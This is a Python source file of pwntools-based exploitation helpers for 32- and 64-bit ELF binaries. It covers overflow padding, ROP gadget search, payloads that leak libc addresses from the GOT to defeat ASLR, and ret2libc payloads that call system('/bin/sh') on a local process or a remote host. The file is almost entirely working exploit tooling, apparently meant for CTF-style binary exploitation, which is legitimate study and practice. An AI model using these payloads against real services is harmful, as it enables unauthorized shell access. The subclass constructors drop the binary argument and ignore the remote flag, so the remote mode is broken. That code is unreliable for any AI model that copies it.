import pwn

class BasicProcess:
    elf = 0
    proc = 0
    libc = 0
    rop_libc = 0
    rop_elf = 0
    exit = 0
    print_function = ''
    leak_function = ''
    size = 0

    # a boolean value as 'local' parameter
    # a string as 'binary' parameter (required)
    # a string as 'ip' paramete (required if local=false)
    # a integer as 'port' parameter (required if local=false)
    # the init function will return a tuple (pwn.process or pwn.remote, pwn.ELF)
    def __init__ (self, local=True, binary = '', ip = '', port = 0):
        self.elf = pwn.ELF (binary)
        self.libc = self.elf.libc
        self.rop_libc = pwn.ROP (self.libc)
        self.rop_elf = pwn.ROP (self.elf)
        if local:
            self.proc = pwn.process (binary)
        else:
            self.proc = pwn.remote (ip, port)

    # a integer as 'size' parameter
    # the function will return a byte array of size 'size'
    def padding (self, size = 0):
        if size == 0:
            size = self.size
        return b'a' * size

    # a integer as 'size' parameter
    # the function will set the class variable 'size'
    def set_size (self, size):
        self.size = size

    # a pwn.process or pwn.remote object as 'proc' parameter
    # a byte array as 'payload' parameter
    # a byte array as 'recv' parameter
    # the function will send the payload after the program
    # print the 'recv' match.
    def send_payload (self, payload, recv = b''):
        if len (recv) > 0:
            self.proc.recvuntil (recv)
        self.proc.sendline (payload)

    # a pwn.ELF object as 'elf' parameter
    # a string as 'rop_pattern' parameter
    # for multiple instruction: 'pop rdi,ret,mov rax,rax...'
    # this function will receive a 'rop_pattern' string and will search for matches on the elf or the libc used by the elf
    def search_rop (self, rop_pattern):
        rop_pattern = rop_pattern.split (',')
        gadgets_elf = self.rop_elf.find_gadget (rop_pattern)
        gadgets_libc = self.rop_libc.find_gadget (rop_pattern)

        if gadgets_elf is None:
            if gadgets_libc is None:
                return 0
            return gadgets_libc [0] + self.libc.address
        return gadgets_elf [0]

    # a integer as 'libc_offset' parameter (optional)
    # a string as 'leak_function' parameter (optional)
    # a integer as 'leak_address' parameter (optional)
    # this function will set the current libc offset, based on parameters
    def set_libc_offset (self, libc_offset = 0, leak_function = None, leak_address = None):
        if libc_offset == 0:
            self.libc.address = leak_address - self.libc.sym [leak_function]
        else:
            self.libc.address = libc_offset

    # a string as 'libc' as parameter
    # this function will set the class variable 'libc' to pwn.ELF ('libc')
    # this is usefull when doing a network attack
    def set_custom_libc (self, libc):
        self.libc = pwn.ELF (libc)

    # a integer as 'exit' parameter
    # this function sets the exit address
    def set_exit_address (self, exit):
        self.exit = exit

class Elf32Process (BasicProcess):
    # a boolean value as 'local' parameter
    # a string as 'binary' parameter (required)
    # a string as 'ip' paramete (required if local=false)
    # a integer as 'port' parameter (required if local=false)
    # the init function will return a tuple (pwn.process or pwn.remote, pwn.ELF)
    def __init__ (self, local=True, binary = '', ip = '', port = 0):
        if local:
            super ().__init__ (binary = binary)
        else:
            super ().__init__ (ip = ip, port = port)

    # a string as 'print_function' parameter
    # a string as 'leak_function' parameter
    # a boolean as 'log' parameter
    # this function will the the print_function from plt and the leak_function from got
    # and will pwn.p32 each address and return as a single byte array as payload
    # if log == true, then print the addresses
    def leak_libc_payload (self, print_function, leak_function, log=False):
        self.print_function = print_function
        self.leak_function = leak_function

        prnt = self.elf.plt [print_function]
        leak = self.elf.got [leak_function]

        if log:
            pwn.log.info ('print_function address: %s' % hex (prnt))
            pwn.log.info ('leak_function address: %s' % hex (leak))
            pwn.log.info ('exit address: %s' % hex (self.exit))

        prnt = pwn.p32 (prnt)
        exit = pwn.p32 (self.exit)
        leak = pwn.p32 (leak)
        return prnt + exit + leak

    # a byte array as 'ignore_str' as parameter
    # a integer as 'recv_count' parameter
    # this function will ignore the bytes in 'ignore_str' and will receive a line
    # this line must contain something otherwise the program will ahang
    # a problem with 'printf' function is that it stops on \x00
    def recv_libc_leak (self, ignore_str = b'', recv_count = 4):
        if len (ignore_str) > 0:
            self.proc.recvuntil (ignore_str)
        leak = self.proc.recv (recv_count)
        leak = pwn.u32 (leak.ljust (4, b'\x00'))
        self.set_libc_offset (leak_function = self.leak_function, leak_address = leak)
        return leak

    # a integer as 'libc_offset' parameter (optional)
    # a boolean as 'log' parameter (optional)
    # this function will create a ret2libc payload, it will find the system() and '/bin/sh'
    # if log == true, then print the addresses
    # returns a byte array with the payload
    def ret2libc_payload (self, log = False):
        sh = next (self.libc.search (b'/bin/sh'))
        system = self.libc.sym ['system']

        if log:
            pwn.log.info ('libc address: %s' % hex (self.libc.address))
            pwn.log.info ('system: %s' % hex (system))
            pwn.log.info ('exit: %s' % hex (self.exit))
            pwn.log.info ('sh: %s' % hex (sh))

        system = pwn.p32 (system)
        exit = pwn.p32 (self.exit)
        sh = pwn.p32 (sh)
        return system + exit + sh

class Elf64Process (BasicProcess):
    # a boolean value as 'local' parameter
    # a string as 'binary' parameter (required)
    # a string as 'ip' paramete (required if local=false)
    # a integer as 'port' parameter (required if local=false)
    # the init function will return a tuple (pwn.process or pwn.remote, pwn.ELF)
    def __init__ (self, local=True, binary = '', ip = '', port = 0):
        if local:
            super ().__init__ (binary = binary)
        else:
            super ().__init__ (ip = ip, port = port)

    # a string as 'print_function' parameter
    # a string as 'leak_function' parameter
    # a boolean as 'log' parameter
    # this function will the the print_function from plt and the leak_function from got
    # and will pwn.p64 each address and return as a single byte array as payload
    # if log == true, then print the addresses
    def leak_libc_payload (self, print_function, leak_function, log=False):
        self.print_function = print_function
        self.leak_function = leak_function

        prnt = self.elf.plt [print_function]
        leak = self.elf.got [leak_function]

        pop_rdi = self.search_rop ('pop rdi,ret')

        if log:
            pwn.log.info ('print_function address: %s' % hex (prnt))
            pwn.log.info ('leak_function address: %s' % hex (leak))
            pwn.log.info ('exit address: %s' % hex (self.exit))
            pwn.log.info ('pop_rdi address: %s' % hex (pop_rdi))

        pop_rdi = pwn.p64 (pop_rdi)
        leak = pwn.p64 (leak)
        prnt = pwn.p64 (prnt)
        exit = pwn.p64 (self.exit)

        return pop_rdi + leak + prnt + exit

    # a byte array as 'ignore_str' as parameter
    # a integer as 'recv_count' parameter
    # this function will ignore the bytes in 'ignore_str' and will receive a line
    # this line must contain something otherwise the program will ahang
    # a problem with 'printf' function is that it stops on \x00
    def recv_libc_leak (self, ignore_str = b'', recv_count = 8):
        if len (ignore_str) > 0:
            self.proc.recvuntil (ignore_str)
        leak = self.proc.recv (recv_count)
        leak = pwn.u64 (leak.ljust (8, b'\x00'))
        self.set_libc_offset (leak_function = self.leak_function, leak_address = leak)

        return leak

    # a boolean as 'log' parameter (optional)
    # this function will create a ret2libc payload, it will find the system() and '/bin/sh'
    # if aslr is on, it will calculate the current offset of libc to bypass this
    # if log == true, then print the addresses
    # returns a byte array with the payload
    def ret2libc_payload (self, log = False):
        libc = self.elf.libc

        pop_rdi = self.search_rop ('pop rdi,ret')
        sh = next (self.libc.search (b'/bin/sh'))
        system = self.libc.sym ['system']

        if log:
            pwn.log.info ('libc address: %s' % hex (self.libc.address))
            pwn.log.info ('system: %s' % hex (system))
            pwn.log.info ('exit: %s' % hex (self.exit))
            pwn.log.info ('sh: %s' % hex (sh))
            pwn.log.info ('pop_rdi: %s' % hex (pop_rdi))

        system = pwn.p64 (system)
        exit = pwn.p64 (self.exit)
        sh = pwn.p64 (sh)
        pop_rdi = pwn.p64 (pop_rdi)

        return pop_rdi + sh + system + exit
